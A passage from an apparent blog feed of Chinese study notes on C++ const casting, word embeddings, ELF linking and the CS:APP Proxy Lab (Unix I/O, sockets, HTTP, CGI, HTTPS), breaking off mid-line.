指针的类型经过封装后也有了限制</span><br>    vector&lt;string&gt;::const_iterator v = a.b.<span class="hljs-built_in">begin</span>();<br>    <span class="hljs-comment">// C 并没有措施</span><br>    <span class="hljs-type">char</span> *t = a.a;<br>    *t = <span class="hljs-string">&#x27;b&#x27;</span>;<br>    <span class="hljs-comment">// cout &lt;&lt; a.a &lt;&lt; endl; 成功改变</span><br>    <br>    <span class="hljs-comment">// 只要得到具体的指针，就可以改变对应值</span><br>    string *d = (string *)&amp;a.b[<span class="hljs-number">0</span>];<br>    cout &lt;&lt; *d &lt;&lt; endl;<br>    (*d)[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;g&#x27;</span>;<br>    cout &lt;&lt; *d &lt;&lt; endl;<br><br>    <span class="hljs-comment">// 类似的</span><br>    string *q = (string *)&amp;a[<span class="hljs-number">0</span>];<br>    (*q)[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;p&#x27;</span>;<br>    cout &lt;&lt; *q &lt;&lt; endl;<br>    <br><br>    <span class="hljs-type">const</span> string g = <span class="hljs-string">&quot;123&quot;</span>;<br>    <span class="hljs-comment">// 并不会检查违法的类型转换，iterator会</span><br>    string *kk = (string *)&amp;g;<br>    (*kk)[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;3&#x27;</span>;<br>    cout &lt;&lt; g &lt;&lt; endl;<br>        <br>    <span class="hljs-comment">// cout &lt;&lt; *p &lt;&lt; endl;</span><br>    <span class="hljs-type">char</span> *p = (<span class="hljs-type">char</span> *)&amp;a.b[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) &#123;<br>        <span class="hljs-comment">//  逐个bit找到对应位置</span><br>        <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;p&#x27;</span>) *p = <span class="hljs-string">&#x27;a&#x27;</span>;<br>        p++;<br>    &#125;<br>    <span class="hljs-comment">// cout &lt;&lt; typeid(p).name() &lt;&lt; endl;</span><br>    <span class="hljs-comment">// cout &lt;&lt; p &lt;&lt; endl;</span><br>    <span class="hljs-comment">// p[0] = &#x27;2&#x27;;</span><br>    cout &lt;&lt; a.b[<span class="hljs-number">0</span>] &lt;&lt; endl;<br>    <br>    <span class="hljs-comment">// 同理，强制类型转换即可</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> gg[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;ggg&quot;</span>;<br>    cout &lt;&lt; gg &lt;&lt; endl;<br>    *(<span class="hljs-type">char</span> *)gg = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    cout &lt;&lt; gg &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS224N NLP</title>
    <link href="/2023/07/20/nlp/"/>
    <url>/2023/07/20/nlp/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识">前置知识</h1><h2 id="encode">Encode</h2><h3 id="embedding">embedding</h3><p>将词汇表示出来 one-hot 每个词都是正交向量，如何表示相似性。</p><p>dense vector: a word meaning is given by the words that frequentlyappear close-by</p><p>word embedding - similiar contexts vector length (dimention) 维度</p><p>word2vec： framework in 2013 for learning word vectors借助中间词预测context，通过极大似然求解最优的word vectors。定义centerwork 和 context word两个vector，基于相似度的权重。指数化可以避免小于0的值 - softmax。参数为所有词的所有向量。</p>]]></content>
    
    
    
    <tags>
      
      <tag>NLP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS143 Compiler</title>
    <link href="/2023/07/20/compile/"/>
    <url>/2023/07/20/compile/</url>
    
    <content type="html"><![CDATA[<h2 id="前置知识">前置知识</h2><p>Interpreter 解释器：程序与数据 输出output 在线 (script) 速度更慢</p><p>Compiler 编译器：Program -&gt; C -&gt; exec (+ data) -&gt; output离线</p><p>Formulas translation - Fortran</p><h3 id="linking-链接">Linking 链接</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// .out .o .elf 都属于可链接文件 不同格式对应的elf文件结构也有区别</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> foo;<br><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> foo;<br>&#125;<br><br><span class="hljs-comment">// readelf --relocs ./a.o</span><br><span class="hljs-comment">// Relocation section &#x27;.rel.text&#x27; at offset 0x2dc contains 1 entries:</span><br><span class="hljs-comment">// Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="hljs-comment">// 00000004  00000801 R_386_32        00000000   foo</span><br><br><span class="hljs-comment">// .rel decides the localtion of variable </span><br><span class="hljs-comment">// objdump --disassembly ./a.out</span><br><span class="hljs-comment">// 3:    a1 </span><br><span class="hljs-comment">// 4: 00 00 00 00         mov    0x0,%eax</span><br><br><span class="hljs-comment">// readelf --headers /bin/ls</span><br><span class="hljs-comment">// [...]</span><br><span class="hljs-comment">// ELF Header:</span><br><span class="hljs-comment">// [...]</span><br><span class="hljs-comment">//   Entry point address:               0x8049bb0</span><br><br><span class="hljs-comment">// Program Headers:</span><br><span class="hljs-comment">// 生成sections</span><br><span class="hljs-comment">//   Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="hljs-comment">// [...]</span><br><span class="hljs-comment">//   LOAD           0x000000 0x08048000 0x08048000 0x16f88 0x16f88 R E 0x1000</span><br><span class="hljs-comment">//   LOAD           0x016f88 0x0805ff88 0x0805ff88 0x01543 0x01543 RW  0x1000</span><br><br><span class="hljs-comment">// 整体的地址空间的映射，因此原来的基于RIP偏移的代码仍然可以复用 </span><br><span class="hljs-comment">// RIP不能直接获得，可以借助函数调用的栈顶间接获得</span><br><br><span class="hljs-comment">// 链接时需要预留代码空间，建立符号链接，便于动态加载器处理</span><br><span class="hljs-comment">// </span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS:APP Proxy Lab记录</title>
    <link href="/2023/07/17/proxy/"/>
    <url>/2023/07/17/proxy/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识">前置知识</h1><p>代理软件，用于接受并转发HTTP请求。借助socket数据结构转发文件 -&gt;并行处理请求 -&gt; 设置cache返回最近获得的网页内容。</p><p>网络代理Proxy，隐藏真实的目的IP，核心在于网络层的包装，应用层一般有https加密，后包装发给代理服务器，代理服务器解包装再发给服务端。</p><p>透明代理：借助网关，将所有的流量重定向到代理器，设备不需要做出设置。</p><h2 id="io">I/O</h2><h3 id="unix-io">unix i/o</h3><p>所有设备模型化为文件，所有的输入、输出都视作文件的读写。</p><p>打开文件：获得描述符，对应打开文件。Shell创建的进程有三个打开问价你，STDIN标准输入，STDOUT标准输出，STDERR标准错误，_FILENO为对应描述符。</p><p>文件位置：起始偏移量 seek 可改变</p><p>读写文件：越界会触发EOF end of file的条件，用于检测，而不是文件结尾有的符号。</p><p>文件类型：普通文件 | 目录文件 | 套接字（跨网络）...</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// flag 如何访问，如何写 </span><br>fd = open(<span class="hljs-type">char</span>* f, <span class="hljs-type">int</span> flags, <span class="hljs-type">mode_t</span> mode);<br><br><span class="hljs-comment">// 返回-1 需要表明异常状态；正数则代表已读的字符数量</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> n)</span>;<br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* buf, <span class="hljs-type">size_t</span> n)</span>;<br><br><span class="hljs-comment">// 可能需要反复读，已得到应用程序要求的数量，一般出现在需要外部输入的情况</span><br><span class="hljs-comment">// robust io 确保一定可以读完要求的字符数</span><br><span class="hljs-comment">// rio_readn rio_writen借助while循环不断读入字符</span><br><span class="hljs-comment">// 带缓冲区的read，在用户空间多设置一个buf (对用户透明的数据结构)</span><br><br><span class="hljs-comment">// readn</span><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">rio_read</span><span class="hljs-params">(<span class="hljs-type">rio_t</span> *rp, <span class="hljs-type">char</span> *usrbuf, <span class="hljs-type">size_t</span> n)</span> &#123;<br>    <span class="hljs-type">int</span> cnt;<br> <br>    <span class="hljs-comment">// 一次性读buffer的size，对于频繁少量的请求，能减少系统调用的次数。</span><br>    <span class="hljs-keyword">while</span> (rp-&gt;rio_cnt &lt;= <span class="hljs-number">0</span>) &#123;<br>        rp-&gt;rio_cnt = read(rp-&gt;rio_fd, rp-&gt;rio_buf,<br>                           <span class="hljs-keyword">sizeof</span>(rp-&gt;rio_buf));<br>        <span class="hljs-keyword">if</span> (rp-&gt;rio_cnt &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (errno != EINTR) <span class="hljs-comment">/* Interrupted by sig handler return */</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rp-&gt;rio_cnt == <span class="hljs-number">0</span>) <span class="hljs-comment">/* EOF */</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">else</span><br>            rp-&gt;rio_bufptr = rp-&gt;rio_buf; <span class="hljs-comment">/* Reset buffer ptr */</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 把buffer已有的部分分配给usrbuf (不需要系统调用) </span><br>    cnt = n;<br>    <span class="hljs-keyword">if</span> (rp-&gt;rio_cnt &lt; n)<br>        cnt = rp-&gt;rio_cnt;<br>    <span class="hljs-built_in">memcpy</span>(usrbuf, rp-&gt;rio_bufptr, cnt);<br>    rp-&gt;rio_bufptr += cnt;<br>    rp-&gt;rio_cnt -= cnt;<br>    <span class="hljs-keyword">return</span> cnt;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// meta data 元数据 struct stat</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br>DIR *<span class="hljs-title function_">opendir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><br><span class="hljs-comment">// The opendir function takes a pathname and returns a pointer to a directory stream.</span><br><span class="hljs-comment">// A stream is an abstraction for an ordered list of items, in this case a list of directory entries</span><br><br><span class="hljs-comment">// owner id / group id  chmod - owern - group - other user </span><br><span class="hljs-comment">// sudo 输入当前的密码 加入group sudo，能够默认以root作为命令的执行者，但密码是自己的密码。 sudo bash 等价于 su root</span><br><br><span class="hljs-comment">// unix kernel represent open file</span><br><span class="hljs-comment">// descriptor table one process one table fd 0 1 2 stdin stdout stderr </span><br><span class="hljs-comment">// open file table (可以只存在于terminal，也可以是存在于disk的，指示此时的读的位置) shared by all process - vnode table (access size type 等实体信息) 多个表项指向同一个vnode即是sharing </span><br><br><span class="hljs-comment">// 若同一个进程想要同时读多个位置，则有多个open file table，同一个vnode节点</span><br><span class="hljs-comment">// fork后fd指向相同的open file table 表项（refcnt++），只有refcnt为0，才会删去该表项。</span><br><br><span class="hljs-comment">// IO 重定向 newfd 指向与oldfd 相同的表项</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dup2</span><span class="hljs-params">(<span class="hljs-type">int</span> oldfd, <span class="hljs-type">int</span> newfd)</span>;<br><br></code></pre></td></tr></table></figure><h3 id="standard-io">standard i/o</h3><p>C standard library libc.so</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// fopen fclose fread fwrite fgets fputs fscanf fprintf </span><br><span class="hljs-comment">// 同样存在buffer操作</span><br><span class="hljs-comment">// The standard I/O library models an open file as a stream. To the programmer, a stream is a pointer to a structure of type FILE.</span><br><span class="hljs-comment">// A stream of type FILE is an abstraction for a file descriptor and a stream buffer.</span><br><br><br><span class="hljs-comment">// 此时才将buffer输出到stdout</span><br>fflush(<span class="hljs-built_in">stdout</span>);<br><br><span class="hljs-comment">// fscanf rio_readlineb 用于text文件而不是二进制文件</span><br><span class="hljs-comment">// 不能用于网络的IO 使用sprintf sscanf format string  </span><br><span class="hljs-comment">// standard-io 是全双工的，对于input后的output（如write之后的read），需要及时fflush（清空缓冲区）或重定向当前文件读写的位置。同理output后input，也需要重新定位。</span><br></code></pre></td></tr></table></figure><h2 id="网络">网络</h2><p>Nework Interface Cart (NIC) (Adapter)网卡，一个IP对应一个MAC（Arp），连接网络层与传输层。多个IP可以对应同一个MAC，但一般一个网卡在传输层接入一个网络。</p><p>Socket对应IP的一个端口（文件描述符），kernel需要根据网络请求的端口选择唤醒的应用程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 创建套接字，不涉及系统调用，声明数据结构并获取fd</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-comment">// Returns: nonnegative descriptor if OK, −1 on error</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">socket</span><span class="hljs-params">(<span class="hljs-type">int</span> domain, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol)</span>;<br>clientfd = Socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// socket的数据结构</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> clientfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> addrlen)</span>;<br><br><span class="hljs-comment">// 大端序存储，该数据结构唯一对应一个抽象的socket地址</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> &#123;</span><br><span class="hljs-type">uint16_t</span> sin_family; <span class="hljs-comment">/* Protocol family (always AF_INET) */</span><br> <span class="hljs-comment">// 端口与ip地址</span><br>    <span class="hljs-type">uint16_t</span> sin_port; <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">sin_addr</span>;</span> <br><span class="hljs-comment">// padding 对齐长度 4Byte + 8Byte + 4Byte = 16Byte</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sin_zero[<span class="hljs-number">8</span>]; <br>&#125;;<br><br><span class="hljs-comment">// 当时缺乏一个void* 可以指向任意socket的指针，需要一个更泛用的数据结构。</span><br><span class="hljs-comment">// 16Byte </span><br><span class="hljs-comment">// bind (sock, (struct sockaddr *) &amp;name, sizeof (name))</span><br><span class="hljs-comment">// 接收sockaddr 实际视作 sockaddr_in (根据sa_family) 借助Cast的特性</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> &#123;</span><br><span class="hljs-type">uint16_t</span> sa_family; <span class="hljs-comment">/* Protocol family */</span><br><span class="hljs-type">char</span> sa_data[<span class="hljs-number">14</span>]; <span class="hljs-comment">/* Address data */</span><br>&#125;;<br><br><span class="hljs-comment">// 将clientfd和server的socket关联，addrlen在ip中等于sizeof(sockaddr_in)</span><br><span class="hljs-comment">// 系统调用，直到出现错误或成功连接才会返回 Returns: 0 if OK, −1 on error</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> clientfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> addrlen)</span>;<br><span class="hljs-comment">// (x:y, addr.sin_addr:addr.sin_port) 对应的连接可以表示为端口间的连接</span><br><br><span class="hljs-comment">// server 将server的fd与server的socket相关联。</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bind</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> addrlen)</span>;<br><br><span class="hljs-comment">// 默认sockfd是主动套接字，存在于连接客户端 active socket，借助listen转换为监听套接字 - backlog对应最多能处理的socket</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">listen</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">int</span> backlog)</span>;<br><br><span class="hljs-comment">// Returns: nonnegative connected descriptor if OK, −1 on error </span><br><span class="hljs-comment">// 生成connfd用于与客户端的连接</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(<span class="hljs-type">int</span> listenfd, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">int</span> *addrlen)</span>;<br><br><span class="hljs-comment">// 将字符串转换为套接字 （类似于索引的过程），同一个函数可以用于各种套接字的生成</span><br><span class="hljs-comment">// 为了多线程设计，更多的细节 返回result addrinfo的链表</span><br><span class="hljs-comment">// 基于这些得到的套接字，客户端会尝试去连接，服务端可以尝试去bind</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getaddrinfo</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *host, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *service, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> addrinfo *hints, <span class="hljs-keyword">struct</span> addrinfo **result)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">freeaddrinfo</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> addrinfo *result)</span>;<br><br><span class="hljs-comment">// sockaddr 转换为各个参数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getnameinfo</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *sa, <span class="hljs-type">socklen_t</span> salen, <span class="hljs-type">char</span> *host, <span class="hljs-type">size_t</span> hostlen, <span class="hljs-type">char</span> *service, <span class="hljs-type">size_t</span> servlen, <span class="hljs-type">int</span> flags)</span>;<br><br><span class="hljs-comment">// 打印域名对应的ip</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> *<span class="hljs-title">p</span>, *<span class="hljs-title">listp</span>, <span class="hljs-title">hints</span>;</span><br>    <span class="hljs-type">char</span> buf[MAXLINE];<br>    <span class="hljs-type">int</span> rc, flags;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: %s &lt;domain name&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Get a list of addrinfo records */</span><br>    <span class="hljs-built_in">memset</span>(&amp;hints, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> addrinfo));<br>    hints.ai_family = AF_INET;       <span class="hljs-comment">/* IPv4 only */</span><br>    hints.ai_socktype = SOCK_STREAM; <span class="hljs-comment">/* Connections only */</span><br>    <br>    <span class="hljs-comment">// 封装了DNS查询的实现</span><br>    <span class="hljs-keyword">if</span> ((rc = getaddrinfo(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, &amp;hints, &amp;listp)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;getaddrinfo error: %s\n&quot;</span>, gai_strerror(rc));<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Walk the list and display each IP address */</span><br>    flags = NI_NUMERICHOST; <span class="hljs-comment">/* Display address string instead of domain name */</span><br>    <span class="hljs-keyword">for</span> (p = listp; p; p = p-&gt;ai_next) &#123;<br>        <span class="hljs-comment">// buf接受信息</span><br>        Getnameinfo(p-&gt;ai_addr, p-&gt;ai_addrlen, buf, MAXLINE, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, flags);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);<br>    &#125;<br><br>    <span class="hljs-comment">/* Clean up */</span><br>    Freeaddrinfo(listp);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="http">HTTP</h2><p>借助HTTP协议交互，通过HTML语言显示内容，浏览器解析内容。</p><p>因此返回的内容content需要指明MIME类型。</p><p>任意返回的内容以文件作为基本单位。</p><p>URL：主机的域名IP + URI（对应服务器中的文件 + ? 后传递的参数）</p><p>最短的URI是 '/'，一般浏览器会自动填充'/'，服务器则同时返回对应的网页。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">telnet www.aol.com 80<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Client: request line</span><br>GET / HTTP/1.1  <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Client: required HTTP/1.1 header</span>  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">附加的头一般用于中间的代理服务器识别是否已有副本，可以直接返回</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">还可以指明能够接收的一些MIME种类</span><br>Host: www.aol.com<br></code></pre></td></tr></table></figure><h3 id="动态内容">动态内容</h3><p>将参数传到子进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// systemd(1) 所有进程的源进程</span><br><span class="hljs-comment">// pstree -p</span><br><br><span class="hljs-comment">// CGI program 指符合CGI标准的可运行程序</span><br><span class="hljs-comment">// GET /cgi-bin/adder?15000&amp;213 HTTP/1.1</span><br><span class="hljs-comment">// 服务器calls fork to create a child process and calls execve to run the /cgi-bin/adder the child process sets the CGI environment variable QUERY_STRING to 15000&amp;213 可通过get_env函数调用得到</span><br><span class="hljs-comment">// 输出时：dup2 function to redirect standard output to the connected descriptor that is associated with the client.</span><br><br><span class="hljs-keyword">if</span> ((buf = getenv(<span class="hljs-string">&quot;QUERY_STRING&quot;</span>)) != <span class="hljs-literal">NULL</span>) &#123;<br>p = <span class="hljs-built_in">strchr</span>(buf, ’&amp;’);<br>*p = ’\<span class="hljs-number">0</span>’;<br><span class="hljs-built_in">strcpy</span>(arg1, buf);<br><span class="hljs-built_in">strcpy</span>(arg2, p + <span class="hljs-number">1</span>);<br>n1 = atoi(arg1);<br>n2 = atoi(arg2);<br>&#125;<br><span class="hljs-comment">/* Make the response body */</span><br>fflush(<span class="hljs-built_in">stdout</span>);<br></code></pre></td></tr></table></figure><h3 id="安全性">安全性</h3><p>网站需要先先向CA机构申领数字证书，CA机构对证书明文Hash后用私钥加密，得到的数字签名颁发到网站。</p><p>客户端发起http请求，提供支持的hash -&gt; 服务端返回数字证书（得到正确的服务端公钥）-&gt;浏览器用密钥R进行对称加密（运算量小），用服务器公钥加密R -&gt;服务端按对应的R加密返回网络内容</p><p>因此基于浏览器的https请求，只要证书没有问题，就可以确保报文的来源。</p><h1 id="具体流程">具体流程</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 